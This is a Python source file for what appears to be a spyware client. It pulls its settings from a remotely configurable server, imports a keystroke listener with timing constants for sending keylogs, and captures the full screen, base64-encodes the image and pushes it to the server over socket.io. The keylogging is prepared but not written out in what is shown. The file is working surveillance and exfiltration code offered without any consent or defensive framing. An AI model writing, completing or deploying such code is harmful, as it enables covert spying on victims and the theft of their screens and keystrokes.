import subprocess, socketio
from enum import Enum
import requests
from time import sleep
from PIL import ImageGrab
import os
from datetime import datetime, timedelta
from pynput.keyboard import Listener
import base64
import numpy


class App:
    VERSION = '1.0'
    BASE_URL = 'http://127.0.0.1:5000'
    KEYLOG_SECONDS_TO_SEND = 8
    KEYLOG_SECONDS_TO_LOOP_SLEEP = 60
    SC_SHOTS_SENDING_IN_SECONDS = 20
    SIO_INSTANCE = None
    KEYLOG_BUFFER_SIZE = 603366

    @classmethod
    def get_config_from_server(cls):
        """
            Get client config from server.
        """
        try:
            res = requests.get(f"{cls.BASE_URL}/client/config")
        except Exception as e:
            try:
                return
            finally:
                e = None
                del e

        else:
            if res.status_code != 200:
                return
            res_json = res.json()
            cls.update(data=res_json)

    @classmethod
    def update(cls, *, data: dict):
        """
            Update Config static variables.

            :param data: should be dict and include one of those keys: (key_logs_minutes,
                                                                        screen_shots_minutes, base_url)
        """
        cls.KEYLOG_SECONDS_TO_SEND = data.get('key_logs_minutes', cls.KEYLOG_SECONDS_TO_SEND) * 60
        cls.SC_SHOTS_SENDING_IN_SECONDS = data.get('screen_shots_minutes', cls.SC_SHOTS_SENDING_IN_SECONDS) * 60
        cls.BASE_URL = data.get('base_url', cls.BASE_URL)
        
sio = socketio.Client()

def take_sc_snaps():
    """
        On mac its need permissions
    """
    size = (1100, 1100)
    
    #sleep(App.SC_SHOTS_SENDING_IN_SECONDS)
          
    screenshot = ImageGrab.grab() #take screenshot
    print("check")
    #screenshot.thumbnail(size) # make image a thumbnail

    img_bytes = screenshot.tobytes() #convert image to bytes
    
    base64_encoded = base64.b64encode(img_bytes).decode('utf-8') #encode to base 64
    
    sio.send('sc_snap', base64_encoded) #send to server, sc_snap function will receive the data
    print("done")
    
    sleep(15)
    






sio.connect((App.BASE_URL), transports=['polling', 'websocket'])
print('my sid is', sio.sid)
take_sc_snaps()

